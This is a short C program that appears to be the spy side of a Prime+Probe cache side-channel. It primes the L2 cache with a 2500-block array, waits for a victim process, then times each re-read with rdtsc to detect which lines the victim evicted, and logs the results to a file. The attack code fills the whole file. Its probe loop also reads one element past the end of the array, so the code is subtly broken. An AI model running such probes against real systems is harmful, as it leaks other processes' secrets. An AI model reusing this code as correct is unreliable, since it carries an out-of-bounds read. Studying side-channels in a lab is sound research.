#include <stdio.h>
#include <stdlib.h>
// Includes rdtsc and mem access instructions
#include "asm.h"
// Includes wait function
#include "tri.h"

// Definition of a structure to directly fill 64 byte per block
typedef struct {
    long data[8];
} mem_block;

void main() {
	// Creation of timers to measure reading time
	long start,end;
	
	// First call of rdtsc to cache its instructions
	start=rdtsc();
	end=rdtsc();
    	mem_block a[2500];
    	
    	// Creation of a file to gather reading times
    	FILE *file=fopen("results.txt", "w");
    	
    	// Filling of l2 cache
    	for (int i=0;i<2500;i++){
		mfence();
		ifence();
		mem_access(&a[i].data[0]);		
    	}
    	 
	// Print are used to ensure correct execution of the process
    	printf("\n 1) SPY prime done tick : %ld",rdtsc()%1000000000000000000);
	
	// Wait victim to read again its data
    	wait(800000);
    	printf("\n 4) SPY starting analysing results %ld \n",rdtsc()%1000000000000000000);
    	
    	// Accesses all of its tab and check if victim accessed its data
    	for (int i=2500;i>0;i--){
    		mfence();
		ifence();
    		start=rdtsc();
		mem_access(&a[i].data[0]);
		end=rdtsc();
		mfence();
		ifence();
		
		// Print reading time in a file
    		fprintf(file, "%ld - %p \n",end-start,&a[i].data[0]);
    		mfence();
		ifence();
    	}
    	fclose(file);
    	printf("\n END) Attacker ended tick : %ld \n",rdtsc()%1000000000000000000);
    }
